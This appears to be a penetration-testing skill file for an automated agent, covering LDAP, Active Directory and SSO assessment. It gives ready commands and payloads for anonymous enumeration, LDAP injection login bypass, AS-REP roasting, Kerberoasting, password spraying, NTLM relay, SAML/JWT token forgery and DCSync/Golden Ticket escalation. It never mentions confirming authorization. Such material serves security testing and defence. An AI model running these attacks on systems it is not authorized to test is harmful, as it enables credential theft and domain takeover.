---
name: ldap_active_directory
description: SSO/LDAP/AD assessment for anonymous binds, injection, directory enumeration, and credential-to-domain escalation.
---

# SSO / LDAP / Active Directory

Directory services (OpenLDAP, 389-DS, Microsoft Active Directory, plus the SSO layers in front — Kerberos, ADFS, SAML/OIDC IdPs) are the identity backbone of an organization. A weakness here rarely stays local: an anonymous bind leaks the org chart and service accounts, an LDAP injection bypasses an application login, a single set of valid credentials enumerates the entire domain, and a misconfigured Kerberos/SSO flow yields tickets or assertions that impersonate any user. The attacker's objective is to move from unauthenticated network access to authenticated directory reads, then to credential material, then to domain-level control.

## Attack Surface

**Exposed services / ports**
- LDAP `389/tcp`, LDAPS `636/tcp`, Global Catalog `3268/3269/tcp` (AD forest-wide)
- Kerberos `88/tcp+udp`, kpasswd `464`, MS-RPC `135`, SMB `445`, WinRM `5985/5986`, LDAP-over-RPC `49152+`
- DNS `53` (SRV records leak DCs), NetBIOS `137-139`
- SSO/web front ends: ADFS (`/adfs/ls/`, `/adfs/services/trust`), SAML ACS endpoints, OIDC `/.well-known/openid-configuration`, Kerberos SPNEGO on `Authorization: Negotiate`

**Application-layer surface**
- App login forms / search boxes that build LDAP filters from user input (injection)
- "Login with SSO" buttons → SAML/OIDC redirects (assertion/token tampering)
- Self-service password reset, GAL/people-search, group-membership lookups
- Service accounts with SPNs (Kerberoastable), pre-auth-disabled accounts (AS-REP roastable)

## Recon & Enumeration

Asset-specific tooling not always preinstalled:
```bash
# ldap utils, impacket, netexec, kerbrute
apt-get install -y ldap-utils 2>/dev/null
pipx install impacket || pip install impacket
pipx install netexec        # nxc (successor to crackmapexec)
go install github.com/ropnop/kerbrute@latest
```

**Service discovery**
```bash
naabu -host dc.target.tld -p 88,135,139,389,445,464,636,3268,3269,5985 -silent
nmap -Pn -p 389,636,3268,3269 --script "ldap-rootdse,ldap-search,ssl-cert" dc.target.tld
# DNS leaks the domain controllers without touching them
dnsx -d target.tld -srv -resp -silent <<< "_ldap._tcp.dc._msdcs.target.tld
_kerberos._tcp.target.tld"
```

**RootDSE (no credentials needed)** — reveals naming contexts, domain FQDN, functional level:
```bash
ldapsearch -x -H ldap://dc.target.tld -s base -b "" "(objectclass=*)" "*" +
```

**Anonymous bind enumeration** — if allowed, dump users/groups/computers:
```bash
ldapsearch -x -H ldap://dc.target.tld -b "DC=target,DC=tld" "(objectClass=user)" \
  sAMAccountName description memberOf userAccountControl
nxc ldap dc.target.tld -u '' -p '' --users          # anonymous
nxc smb  dc.target.tld -u '' -p '' --shares --pass-pol
```

**Username harvesting (pre-auth, low noise)** — Kerberos tells you which names exist:
```bash
kerbrute userenum -d target.tld --dc dc.target.tld users.txt
```

**SSO endpoints**
```bash
httpx -l hosts.txt -path /.well-known/openid-configuration,/adfs/ls/IdpInitiatedSignon.aspx -mc 200 -title
nuclei -u https://sso.target.tld -tags adfs,saml,oidc,ldap -s critical,high,medium -silent
katana -u https://app.target.tld -jc | grep -Ei 'saml|sso|oauth|oidc|adfs|/login'
```

## Methodology

1. **Map the directory perimeter.** naabu/nmap for 389/636/88/445/3268; resolve DC SRV records with dnsx. Pull RootDSE to confirm the base DN and whether it's AD vs OpenLDAP.
2. **Test anonymous access first.** Empty-credential bind + Global Catalog (3268) search. Capture every `description`/`info`/`comment` attribute — passwords live there far too often.
3. **Harvest usernames** via kerbrute userenum and any anonymous user dump; build `users.txt` for spraying and roasting.
4. **AS-REP roast** accounts with `DONT_REQ_PREAUTH` (no creds required). Crack offline.
5. **Acquire one credential** — careful low-rate spray (honor lockout policy from `--pass-pol`), or crack an AS-REP/Kerberoast hash.
6. **Authenticated enumeration.** With any valid account, run BloodHound collection (nxc/bloodhound-python) and Kerberoast all SPN accounts.
7. **Application LDAP injection.** Independently, fuzz every app login/search that talks to the directory for filter injection and auth bypass.
8. **SSO flow analysis.** Decode SAML assertions / OIDC tokens; test signature stripping, audience/issuer confusion, and replay.
9. **Plan escalation paths** from BloodHound (ACL abuse, delegation, GPO) toward Domain Admin / forest trust.

## Key Weaknesses / Techniques

### Anonymous / unauthenticated bind
OpenLDAP `olcDisallows` not set, or AD `dsHeuristics` permitting anonymous reads. Confirm with the empty-bind `ldapsearch` above. Even read-only anonymous access leaks `userAccountControl` flags (find disabled-preauth and never-expire accounts) and cleartext secrets in `description`.

### LDAP injection (application auth bypass)
App builds a filter like `(&(uid=$user)(password=$pass))`. Inject filter metacharacters:
```
# username field — close uid, force objectClass=* match, comment-out the rest
*)(uid=*))(|(uid=*
# always-true wildcard
*)(|(objectClass=*
# auth bypass: make password clause irrelevant
admin)(|(password=*
```
Blind/boolean injection to exfiltrate attributes char-by-char:
```
admin)(|(description=A*   → true/false oracle on first char
```
Automate the fuzz with ffuf against the form parameter and a filter-meta wordlist, diffing response length:
```bash
ffuf -u https://app.target.tld/login -X POST -d 'user=FUZZ&pass=x' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -w ldap_inject.txt -mode clusterbomb -fr 'invalid' -ac
```

### AS-REP roasting (no creds)
```bash
impacket-GetNPUsers target.tld/ -usersfile users.txt -dc-ip <dc> -no-pass -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash rockyou.txt
```

### Kerberoasting (one valid cred)
```bash
impacket-GetUserSPNs target.tld/user:pass -dc-ip <dc> -request -outputfile spn.hash
nxc ldap dc.target.tld -u user -p pass --kerberoasting kerb.out
hashcat -m 13100 spn.hash rockyou.txt
```

### Password spraying (lockout-aware)
```bash
nxc smb dc.target.tld -u users.txt -p 'Season2026!' --continue-on-success
# one password per round, wait out the observation window between rounds
```

### LDAPS / channel-binding & signing
AD not enforcing LDAP signing / channel binding → NTLM relay to LDAP for object creation or RBCD. Probe:
```bash
nxc ldap dc.target.tld -u user -p pass -M ldap-checker
```

### SSO assertion / token abuse
- SAML: decode the `SAMLResponse` (base64+inflate), attempt **signature stripping** (remove `<Signature>`), XML signature wrapping, and `NameID` swapping to another user; replay within validity window.
- OIDC/JWT: check `alg:none`, weak HMAC secret, `kid` injection, and audience/issuer confusion across multiple RPs.
```bash
jwt_tool <token> -M at        # all attacks incl. alg confusion
jwt_tool <token> -X a         # alg:none
```
- ADFS: legacy IdP-initiated sign-on and `wctx`/`wreply` open-redirect / token-replay weaknesses.

## Validation

- **Anonymous bind:** show a successful empty-credential `ldapsearch` returning real user objects (redact secrets). The bind succeeding with `-x` and no `-D`/`-w` is the proof.
- **LDAP injection:** demonstrate authenticating with no valid password, or extract one out-of-band attribute via the boolean oracle, with the exact request/response diff.
- **Roasting:** crack at least one hash to a plaintext and confirm it binds (`nxc smb ... -u <u> -p <cracked>` → `[+]`). Cracking proves real impact; the hash alone does not.
- **SSO bypass:** present a forged assertion/token that the SP accepts (authenticated session as a different principal) — capture the post-login authenticated request.
- Always re-run the PoC to confirm determinism and record exact base DN, filter, and endpoint.

## False Positives

- "Anonymous bind succeeds" but returns **zero objects** — RootDSE base reads are allowed by design; that is not a leak unless directory objects come back.
- LDAP filter metacharacters that error out (`invalid filter`) without changing auth outcome — input reaching the filter is not the same as a bypass; require a behavioral change.
- Kerberoast/AS-REP hashes that never crack — uncracked = no demonstrated impact, report as informational at most.
- `userAccountControl` "password never expires" alone is a hygiene note, not a vuln.
- SAML `alg:none` accepted by a decoder you control but **rejected by the actual SP** — only the SP's acceptance counts.
- Spray "valid" hits that are honeypot/canary accounts (no group membership, recently created) — verify with a real authenticated action.

## Chaining & Impact

- Anonymous bind → cleartext password in `description` → valid domain credential → Kerberoast → crack service account → its ACLs/SPN privileges.
- One low-priv cred → BloodHound → ACL/GPO/delegation path (e.g., `GenericWrite` on a user, RBCD via unconstrained/constrained delegation) → Domain Admin.
- LDAP signing off → NTLM relay to LDAP → add machine account + configure RBCD → DCSync.
- DCSync (`impacket-secretsdump -just-dc target.tld/da:pass@dc`) → krbtgt hash → Golden Ticket → persistent forest-wide impersonation.
- SAML/ADFS key compromise or signature bypass → forge assertions for any user (Golden SAML) → SSO into every federated app (cloud included) without touching the DC.
- Forest trust abuse: child-domain compromise → SID history / inter-realm TGT → parent domain.

## Pro Tips

1. Query the **Global Catalog (3268)** instead of 389 — it returns forest-wide objects and is frequently less monitored.
2. Grep every directory dump for secrets in metadata: `description`, `info`, `comment`, `userPassword`, `unixUserPassword`, and AD LAPS `ms-Mcs-AdmPwd`.
3. Always pull `--pass-pol` before spraying; one wrong round can lock hundreds of accounts and burn the engagement.
4. AS-REP roasting needs **no credentials** — run it the moment you have a username list; it is the cheapest path to a first cred.
5. Prefer Kerberos auth (`-k`) over NTLM with impacket/nxc when signing is enforced; it sidesteps several hardening controls.
6. For LDAP injection, the highest-value sink is the login filter, but people-search and group-lookup endpoints often have laxer filtering and richer attribute returns.
7. Decode SAML with `python3 -c 'import base64,zlib,sys;print(zlib.decompress(base64.b64decode(sys.argv[1]),-15))'` — redirect-binding assertions are deflate-compressed.
8. trufflehog/gitleaks the org's repos for hardcoded bind DNs and service-account passwords before you ever touch the DC — config files leak `BIND_DN`/`LDAP_PASSWORD` constantly.
9. Keep all directory reads scoped and rate-limited; mass GC sweeps trip directory-service auditing fast.
